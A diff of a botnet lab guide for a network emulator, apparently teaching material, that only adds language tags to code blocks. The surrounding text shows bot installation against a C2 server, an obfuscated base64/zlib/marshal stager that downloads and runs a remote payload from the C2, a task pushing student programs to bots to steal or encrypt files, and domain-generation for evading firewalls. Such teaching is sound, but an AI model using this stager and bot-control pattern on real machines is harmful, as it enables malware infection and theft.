@@ -69,7 +69,7 @@ for asn in [151,152,153,154,155]:
 
 In the previous task, we have the IP address of C2 server ```10.150.0.71```, so we just need to use ```install``` API to install our bots. The virtual nodes name will be ```bot151, bot152, bot153, bot154, bot155```. With bot client installation, we also need to invoke ```setServer``` to setup Botnet client, because we have to tell Botnet who is the controller. Finally, we have to add bindings to map those virtual nodes to our physical nodes. By using ```sim.addBinding ``` API to specify each virtual node to which physical node.  After that, we just need to add ```bot``` and ```bot_client``` layer on our emulator, that will be good for entire setup process.
 
-```
+```python3
 sim.addLayer(bot)
 sim.addLayer(bot_client)
 sim.render()
@@ -100,7 +100,7 @@ The port 445 is the port that will be used for communication with bots. This por
 
 So how it works? Let's jump to perspective of bots client and see what happend in client side. First, bot client will run ```python3 /tmp/BotClient.py``` in the background when we bring up containers (It should be waiting until network configuration ready). We can attach to any of bot client container and open that file. The following is the code of ```BotClient.py```.
 
-```
+```python3
 import sys,zlib,base64,marshal,json,urllib
 if sys.version_info[0] > 2:
     from urllib import request
@@ -109,7 +109,7 @@ exec(eval(marshal.loads(zlib.decompress(base64.b64decode(b'eJwrtWBgYCgtyskvSM3TU
 ```
 There is one critical factor of bot program is the size. Because in real world, bots can be many types of system, such as IoT device, busybox, Android and so on, so from attacker perspective, they do not want to bot getting infection failed due to some dependencies issues. Therefore, it is important to reduce the size of bot program, in order to make it more stable. As we can see the above code. It will invoke ```exec``` to run another piece of code. That code has been decoded for some times and eventually run it. We can print out what it is after decoding. Here is the out put.
 
-```
+```python3
 urlopen('http://10.150.0.71:446//stagers/b6H.py').read()
 ```
 Basically, bot program will fetch another python file from remote server, which is also our C2 server, but the port is 446 (another port binded by C2 server, used for providing payload), through HTTP protocol. The ```b6H.py``` is our real bot main program, it contains how the bot communicate with C2 server, and running different types of jobs (like re-connect to C2 server). In this case(Byob framework), the communication protocol between C2 and bots is TCP, it use a JSON to maintain the commands, including ```task_id```, ```command``` etc fields. Just keep that in mind, in real world, the communication method can be various, because attack and defense are a continuous process, if a communication protocol is detected by the firewall, the attacker will change another communication protocol to bypass the detection.
@@ -138,7 +138,7 @@ $ tcpdump icmp
 
 In this task, students need to write their own program and push to each bot, then use C2 console to launch the program by using ```broadcast``` command. After launching, each of bots should automatically execute this program. In your own program, you can do something that you think is interesting, for example: Steal a secret file, encrypt a file etc. The following code snippet shows how can we put your program in each bot. ***(Notice: In bot client environment, only support Python3)***
 
-```
+```python3
 ...
 for asn in [151,152,153,154,155]:
     vname = "bot" + str(asn)
@@ -160,7 +160,7 @@ In Botnet technology, there is a important concept called DGA (Domain generation
 
 In this task, we will apply DGA technology on our emulator to simulate evading Firewalls, so students can understand how it works. All the code are from ```Task4.py``` in the ```Labsetup``` folder. Normally, the group of domain should be changed everyday in real world. However, in our lab, we would reduce the timeslot be to 5 minutes, in order to let students easily observe the process. We have already implemented DGA feature in our emulator. The following code shows how can we setup a Domain Registrar service and enable DGA function in bots client.
 
-```
+```python3
 ###########################################
 def dga() -> list:
     #Generate 10 domains for the given time.
